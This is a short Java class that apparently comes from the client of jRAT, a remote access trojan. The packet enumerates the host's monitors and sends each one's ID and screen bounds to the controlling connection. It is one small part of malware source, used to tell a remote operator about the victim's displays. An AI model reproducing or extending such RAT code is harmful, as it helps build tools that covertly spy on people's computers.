package jrat.client.packets.outgoing;

import jrat.client.Connection;
import jrat.common.utils.Utils;

import java.awt.*;


public class Packet18InitMonitors extends AbstractOutgoingPacket {

	@Override
	public void write(Connection con) throws Exception {
		if (!Utils.isHeadless()) {		
			GraphicsDevice[] monitors = GraphicsEnvironment.getLocalGraphicsEnvironment().getScreenDevices();

            con.writeInt(monitors.length);

			for (GraphicsDevice device : monitors) {
				Rectangle bounds = device.getDefaultConfiguration().getBounds();
				String id = device.getIDstring();
				if (id.startsWith("\\")) {
					id = id.substring(1, id.length());
				}

                con.writeLine(id);
                con.writeInt(bounds.x);
                con.writeInt(bounds.y);
                con.writeInt(bounds.width);
                con.writeInt(bounds.height);
			}
		} else {
            con.writeInt(0);
		}
	}

	@Override
	public short getPacketId() {
		return (byte) 18;
	}

}
